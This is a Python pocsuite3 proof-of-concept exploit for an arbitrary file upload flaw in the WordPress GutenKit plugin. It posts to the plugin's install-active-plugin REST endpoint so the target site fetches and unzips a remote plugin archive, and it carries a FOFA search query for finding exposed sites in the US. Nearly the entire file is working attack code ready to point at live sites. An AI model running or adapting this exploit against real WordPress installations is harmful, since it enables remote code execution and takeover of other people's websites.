from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, random_str

import os

os.environ['HTTP_PROXY'] = 'http://127.0.0.1:7890'
os.environ['HTTPS_PROXY'] = 'http://127.0.0.1:7890'
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = 'WordPress插件GutenKit存在任意文件上传漏洞'
    appName = 'wordpress'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    dork = {'fofa': 'body="wp-content/plugins/gutenkit-blocks-addon" && country="US"'}

    def _verify(self):  # 验证模式
        path = "/wp-json/gutenkit/v1/install-active-plugin"
        url = self.url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "plugin": "http://127.0.0.1/test.zip"
        }
        try:
            response = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
            if response.status_code == 200 and "after unzipping" in response.text:
                result = {'VerifyInfo': {}}
                result['VerifyInfo']['URL'] = self.url
                return self.parse_output(result)
            else:
                return None
        except Exception as e:
            logger.error(f"An error occurred: {str(e)}")
            return

register_poc(DemoPOC)